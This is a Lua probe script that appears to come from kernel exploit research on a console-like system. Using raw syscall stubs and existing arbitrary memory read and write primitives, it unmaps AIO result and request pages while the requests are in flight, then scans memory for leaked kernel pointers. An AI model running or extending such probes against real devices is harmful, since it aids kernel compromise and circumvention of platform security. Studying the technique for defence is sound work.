-- CRASH_CLASS: MODERATE
-- PROBE 353d2: AIO result-buffer unmap — clean version
--
-- 353d v1 got binary garbage because it tried to read the unmapped page.
-- This version: submit AIO to a mmap page, munmap it, DON'T touch it.
-- Use only stable memory for polling/scanning after the unmap.
-- Goal: does AIO completion fault, leak a kptr, or leave kernel state dirty?

print("=== PROBE 353d2: AIO UNMAP CLEAN ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sc_mmap   = mk(477)
local sc_munmap = mk(73)
local sc_open   = mk(5)
local sc_close  = mk(6)
local sc_aio    = mk(669)
local sc_poll   = mk(664)
local sc_del    = mk(662)

local PAGE = 0x4000

-- Open /dev/zero for read AIO
local path_buf = memory.alloc(16)
for i = 1, 9 do wd(N(path_buf) + i - 1, string.byte("/dev/zero", i)) end
wd(N(path_buf) + 9, 0)
local fd_ret = nil
pcall(function() fd_ret = sc_open(path_buf, uint64(0), uint64(0)) end)
local zero_fd = fd_ret and N(fd_ret) or -1
print("zero_fd=" .. zero_fd)
if zero_fd < 0 or zero_fd > 0x10000 then
    print("ABORT: can't open /dev/zero")
    return
end

-- All stable buffers (heap, never unmapped)
local req_buf  = memory.alloc(0x30)
local id_buf   = memory.alloc(0x10)
local poll_buf = memory.alloc(0x20)
local gpu_scan = memory.alloc(0x1000)

local function scan_kptr(addr, len, label)
    local found = 0
    for off = 0, len - 8, 4 do
        local q = rq(addr + off)
        if q then
            local h = 0
            if type(q) == "table" and q.h then h = q.h end
            if h < 0 then h = h + 0x100000000 end
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  *** KPTR %s+0x%X: %s ***", label, off, fmt(q)))
                found = found + 1
            end
        end
    end
    return found
end

local total_kptr = 0

-- ============ TEST A: Unmap result buffer after submit ============
-- AIO reads from /dev/zero into a mmap page.
-- We unmap the page immediately. Kernel copyout() should fault.
print("")
print("[A] Unmap result buffer after AIO submit (5 rounds)")

for round = 1, 5 do
    if not alive() then print("  R" .. round .. " DEAD"); break end

    -- Allocate a fresh page via GPU mmap (0x33 prot, known working)
    local page = nil
    pcall(function()
        page = sc_mmap(uint64(0), uint64(PAGE), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not page then print("  R" .. round .. " mmap=nil"); break end
    local pn = N(page)
    if pn == 0 then print("  R" .. round .. " mmap=0"); break end

    -- Write sentinel to page (verify it's mapped)
    wd(pn, 0xAAAAAAAA)
    local check = rd(pn) or 0
    if check ~= 0xAAAAAAAA then
        print(string.format("  R%d mmap mapped but read-back=0x%X", round, check))
        break
    end

    -- Build AIO request in STABLE memory
    for off = 0, 0x2C, 4 do wd(N(req_buf) + off, 0) end
    wd(N(req_buf), zero_fd)
    wq(N(req_buf) + 0x08, page)      -- result buffer → the page we'll unmap
    wq(N(req_buf) + 0x10, uint64(64))
    wq(N(req_buf) + 0x18, uint64(0))

    -- Submit
    wq(N(id_buf), uint64(0))
    local sret = nil
    pcall(function()
        sret = sc_aio(uint64(1), req_buf, uint64(1), uint64(1), id_buf)
    end)
    local aio_id = rd(N(id_buf)) or 0

    -- IMMEDIATELY munmap the result page
    local mret = nil
    pcall(function() mret = sc_munmap(page, uint64(PAGE)) end)
    local munmap_ok = mret and N(mret) == 0

    -- DO NOT touch the unmapped page!
    -- Poll status from STABLE memory
    for off = 0, 0x1C, 4 do wd(N(poll_buf) + off, 0) end
    wd(N(poll_buf), aio_id)
    local pret = nil
    pcall(function()
        pret = sc_poll(poll_buf, uint64(1), uint64(0))
    end)
    local poll_st = rd(N(poll_buf) + 4) or -1

    -- Scan heap around req_buf for kptrs
    local kp = scan_kptr(N(req_buf), 0x30, "req")
    kp = kp + scan_kptr(N(poll_buf), 0x20, "poll")
    total_kptr = total_kptr + kp

    print(string.format("  R%d: addr=%s submit=%s id=0x%X munmap=%s poll=0x%X kp=%d alive=%s",
        round, fmt(page), fmt(sret), aio_id, tostring(munmap_ok),
        poll_st, kp, tostring(alive())))
end

-- ============ TEST B: Unmap REQUEST array after submit ============
print("")
print("[B] Unmap request array after AIO submit (5 rounds)")

for round = 1, 5 do
    if not alive() then print("  R" .. round .. " DEAD"); break end

    -- mmap page for request struct
    local rpage = nil
    pcall(function()
        rpage = sc_mmap(uint64(0), uint64(PAGE), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not rpage then print("  R" .. round .. " mmap=nil"); break end
    local rpn = N(rpage)
    if rpn == 0 then print("  R" .. round .. " mmap=0"); break end

    -- Result in stable memory
    local res_buf = memory.alloc(0x80)
    for off = 0, 0x7C, 4 do wd(N(res_buf) + off, 0xBBBBBBBB) end

    -- Build request in mmap page
    for off = 0, 0x2C, 4 do wd(rpn + off, 0) end
    wd(rpn, zero_fd)
    wq(rpn + 0x08, uint64(string.format("0x%X", N(res_buf))))
    wq(rpn + 0x10, uint64(16))
    wq(rpn + 0x18, uint64(0))

    -- Submit
    wq(N(id_buf), uint64(0))
    local sret = nil
    pcall(function()
        sret = sc_aio(uint64(1), rpage, uint64(1), uint64(1), id_buf)
    end)
    local aio_id = rd(N(id_buf)) or 0

    -- IMMEDIATELY munmap the request page
    local mret = nil
    pcall(function() mret = sc_munmap(rpage, uint64(PAGE)) end)
    local munmap_ok = mret and N(mret) == 0

    -- Poll
    for off = 0, 0x1C, 4 do wd(N(poll_buf) + off, 0) end
    wd(N(poll_buf), aio_id)
    pcall(function() sc_poll(poll_buf, uint64(1), uint64(0)) end)
    local poll_st = rd(N(poll_buf) + 4) or -1

    -- Check result buffer (stable memory)
    local rv0 = rd(N(res_buf)) or 0
    local rv4 = rd(N(res_buf) + 4) or 0

    local kp = scan_kptr(N(res_buf), 0x80, "res")
    total_kptr = total_kptr + kp

    print(string.format("  R%d: addr=%s submit=%s id=0x%X munmap=%s poll=0x%X res0=0x%08X res4=0x%08X kp=%d",
        round, fmt(rpage), fmt(sret), aio_id, tostring(munmap_ok),
        poll_st, rv0, rv4, kp))
end

-- ============ TEST C: Large GPU scan for leaked kptrs ============
print("")
print("[C] GPU pool scan for leaked kptrs after unmap tests")
if alive() then
    local gpu = nil
    pcall(function()
        gpu = sc_mmap(uint64(0), uint64(16*PAGE), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if gpu and N(gpu) ~= 0 then
        local gn = N(gpu)
        local kp = scan_kptr(gn, 0x2000, "gpu")
        total_kptr = total_kptr + kp
        if kp == 0 then print("  gpu scan: clean") end
    else
        print("  gpu mmap failed")
    end
end

pcall(function() sc_close(uint64(zero_fd)) end)

print("")
print(string.format("TOTAL kptr=%d", total_kptr))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 353d2 COMPLETE ===")
